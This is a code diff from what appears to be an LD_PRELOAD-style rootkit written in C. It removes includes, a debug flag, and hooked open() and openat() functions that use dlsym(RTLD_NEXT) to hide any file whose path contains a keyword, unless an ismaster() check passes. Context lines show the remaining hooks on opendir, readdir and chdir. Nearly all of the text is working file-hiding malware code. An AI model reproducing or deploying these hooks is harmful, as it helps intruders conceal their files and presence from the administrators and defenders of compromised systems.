@@ -4,22 +4,7 @@
 *Hooks system calls to hide files using a keyword
 *
 */
-#include <stdio.h>
-#include <stdlib.h>
-#include <dlfcn.h>
-#include <stdarg.h>
-#include <errno.h>
-#include <dirent.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <pwd.h>
-
 #include "h00k.h"
-
-//??
-int (*old_open)(const char *pathname, int flags, mode_t mode);
-int (*old_openat)(int dirfd, const char *pathname, int flags, mode_t mode);
 
 //directory stuff
 DIR *(*old_opendir)(const char *name);
@@ -28,10 +13,6 @@ struct dirent *(*old_readdir)(DIR *dirp);
 struct dirent64 *(*old_readdir64)(DIR *dirp);
 int (*old_chdir)(const char *path);
 int (*old_fchdir)(int fd);
-
-
-//Let's debug fam
-#define DEBUG 1
 
 int ismaster(){
 
@@ -65,49 +46,6 @@ int ismaster(){
     }
 
     return 1;
-
-}
-
-int open(const char *pathname, int flags, mode_t mode){
-   
-    #ifdef DEBUG
-	printf("open hooked\n");
-    #endif
-
-
-    if(!old_open){
-	old_open = dlsym(RTLD_NEXT,"open");
-    }
-
-    if(strstr(pathname, keyword)){
-	if(ismaster() != 0){
-	    errno = ENOENT;
-	    return -1;
-	}
-    }
-    
-    return old_open(pathname, flags, mode);
-
-}
-
-int openat(int dirfd, const char *pathname, int flags, mode_t mode){
-   
-    #ifdef DEBUG
-	printf("openat hooked\n");
-    #endif
-
-    if(!old_openat){
-	old_openat = dlsym(RTLD_NEXT,"openat");
-    }
-
-    if(strstr(pathname, keyword)){
-	if(ismaster() != 0){
-	    errno = ENOENT;
-	    return -1;
-	}
-    }
-
-    return old_openat(dirfd, pathname, flags, mode);
 }
 
 //hook the opendir function
